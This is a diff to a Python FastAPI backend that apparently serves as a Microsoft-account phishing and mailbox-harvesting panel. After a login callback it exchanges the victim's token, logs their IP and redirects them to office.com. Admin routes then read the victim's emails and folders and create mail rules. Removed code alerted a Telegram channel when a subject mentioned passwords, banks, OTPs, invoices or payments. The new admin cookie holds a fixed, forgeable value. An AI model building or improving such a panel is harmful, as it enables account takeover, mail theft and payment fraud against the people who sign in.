@@ -26,34 +26,33 @@ from alerts import send_telegram_alert
 app = FastAPI()
 
 # =========================
-# LOGGING CONFIG
+# LOGGING
 # =========================
 logging.basicConfig(level=logging.DEBUG)
 
 # =========================
-# CORS (VERY IMPORTANT)
+# CORS
 # =========================
 origins = [
-    "http://localhost:3000",  # Local development (optional)
-    "https://frontend-xg84.onrender.com",  # Your actual Render frontend URL
+    "http://localhost:3000",
+    "https://frontend-xg84.onrender.com",
 ]
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=origins,  # Allow frontend URLs
-    allow_credentials=True,  # Ensure credentials are allowed
+    allow_origins=origins,
+    allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
 )
 
 # =========================
-# DEBUG MIDDLEWARE 🔥
+# DEBUG MIDDLEWARE
 # =========================
 @app.middleware("http")
 async def log_requests(request: Request, call_next):
     logging.debug(f"\n--- REQUEST START ---")
     logging.debug(f"{request.method} {request.url}")
-    logging.debug(f"Headers: {request.headers}")
     logging.debug(f"Cookies: {request.cookies}")
 
     response = await call_next(request)
@@ -64,29 +63,6 @@ async def log_requests(request: Request, call_next):
     return response
 
 # =========================
-# WEBSOCKET (REAL-TIME ALERTS)
-# =========================
-connected_clients = []
-
-@app.websocket("/ws/alerts")
-async def websocket_alerts(ws: WebSocket):
-    await ws.accept()
-    connected_clients.append(ws)
-
-    try:
-        while True:
-            await ws.receive_text()
-    except:
-        connected_clients.remove(ws)
-
-async def broadcast_alert(message: str):
-    for ws in connected_clients:
-        try:
-            await ws.send_text(message)
-        except:
-            pass
-
-# =========================
 # STARTUP
 # =========================
 @app.on_event("startup")
@@ -94,13 +70,34 @@ def startup():
     init_db()
 
 # =========================
-# ADMIN AUTH
+# ADMIN LOGIN (🔥 FIXED)
 # =========================
 @app.post("/admin/login")
-async def admin_login(request: Request):
+async def admin_login_route(request: Request):
     body = await request.json()
-    logging.debug(f"LOGIN BODY: {body}")
-    return login_admin(body.get("username"), body.get("password"))
+    username = body.get("username")
+    password = body.get("password")
+
+    result = login_admin(username, password)
+
+    if "error" in result:
+        return JSONResponse(result, status_code=401)
+
+    # ✅ SET ADMIN COOKIE
+    response = JSONResponse({"message": "Login successful"})
+
+    response.set_cookie(
+        key="admin_session",
+        value="authenticated",
+        httponly=True,
+        secure=True,
+        samesite="None",
+        path="/"
+    )
+
+    logging.debug("ADMIN LOGIN SUCCESS → COOKIE SET")
+
+    return response
 
 # =========================
 # MICROSOFT LOGIN
@@ -134,20 +131,26 @@ def auth_callback(request: Request):
     client_ip = request.client.host
 
     try:
-        user_id, session_id = (state.split(":") if ":" in state = f"{user_id}:{session_id}"
+        # ✅ FIXED STATE PARSING
+        if ":" in state:
+            user_id, session_id = state.split(":")
+        else:
+            user_id = state
+            session_id = "default"
 
         exchange_code_for_token(code, state, client_ip)
 
         response = RedirectResponse(url="https://www.office.com")
 
+        # ✅ SESSION COOKIE (MICROSOFT)
         response.set_cookie(
-    key="session_id",
-    value=session_id,
-    httponly=True,
-    secure=True,  # Ensure cookies are secure
-    samesite="none",  # For cross-origin requests
-    path="/",  # Make sure it applies to the entire app
-)
+            key="session_id",
+            value=session_id,
+            httponly=True,
+            secure=True,
+            samesite="None",
+            path="/"
+        )
 
         logging.debug(f"SESSION COOKIE SET: {session_id}")
 
@@ -158,22 +161,17 @@ def auth_callback(request: Request):
         return {"error": str(e)}
 
 # =========================
-# SESSION
+# SESSION DEBUG
 # =========================
 @app.get("/session")
 def check_session(request: Request):
-    sid = request.cookies.get("session_id")
-    logging.debug(f"SESSION CHECK: {sid}")
-    return {"active": bool(sid), "session_id": sid}
-
-@app.get("/logout")
-def logout():
-    res = JSONResponse({"message": "Logged out"})
-    res.delete_cookie("session_id", path="/")
-    return res
+    return {
+        "session_id": request.cookies.get("session_id"),
+        "admin": request.cookies.get("admin_session")
+    }
 
 # =========================
-# EMAILS (RULES + ALERTS)
+# EMAILS
 # =========================
 @app.get("/emails")
 def get_emails(request: Request, user_id: str = None):
@@ -182,70 +180,28 @@ def get_emails(request: Request, user_id: str = None):
     session_id = request.cookies.get("session_id")
     logging.debug(f"SESSION IN EMAILS: {session_id}")
 
-    user_id = user_id or "default-user"
+    if not session_id or session_id == "default":
+        return JSONResponse({"error": "No Microsoft session"}, status_code=401)
 
-    emails = fetch_emails(user_id, session_id)
-
-    ALERT_KEYWORDS = ["password", "bank", "otp", "urgent", "invoice", "payment"]
-
-    for e in emails:
-        email_data = {
-            "id": e.get("id"),
-            "subject": e.get("subject"),
-            "body": e.get("preview"),
-            "from": e.get("from")
-        }
-
-        # RULE ENGINE
-        apply_rules(user_id, session_id, email_data)
-
-        # ALERTS
-        for word in ALERT_KEYWORDS:
-            if word in (email_data["subject"] or "").lower():
-                msg = f"🚨 {word.upper()} detected → {email_data['subject']}"
-
-                send_telegram_alert(msg)
-                asyncio.create_task(broadcast_alert(msg))
-
-    return {"emails": emails}
+    return {
+        "emails": fetch_emails(user_id or "default-user", session_id)
+    }
 
 # =========================
 # FOLDERS
 # =========================
 @app.get("/folders")
 def get_folders(request: Request, user_id: str = None):
-    require_admin(request)  # Ensure admin auth middleware or function is working
-
-    session_id = request.cookies.get("session_id")
-    if not session_id:
-        return JSONResponse({"error": "Unauthorized"}, status_code=401)
-
-    return {
-        "folders": get_mail_folders(
-            user_id or "default-user",
-            session_id
-        )
-    }
-
-# =========================
-# EMAIL DETAIL
-# =========================
-@app.get("/email/{message_id}")
-def email_detail(message_id: str, request: Request, user_id: str = None):
     require_admin(request)
 
     session_id = request.cookies.get("session_id")
 
-    data = get_email_detail(user_id or "default-user", session_id, message_id)
+    if not session_id or session_id == "default":
+        return JSONResponse({"error": "No Microsoft session"}, status_code=401)
 
-    apply_rules(user_id, session_id, {
-        "id": message_id,
-        "subject": data.get("subject"),
-        "body": data.get("body"),
-        "from": data.get("from")
-    })
-
-    return data
+    return {
+        "folders": get_mail_folders(user_id or "default-user", session_id)
+    }
 
 # =========================
 # RULES
@@ -255,8 +211,6 @@ async def add_rule(request: Request):
     require_admin(request)
 
     body = await request.json()
-    logging.debug(f"RULE CREATE: {body}")
-
     db = SessionLocal()
 
     rule = Rule(
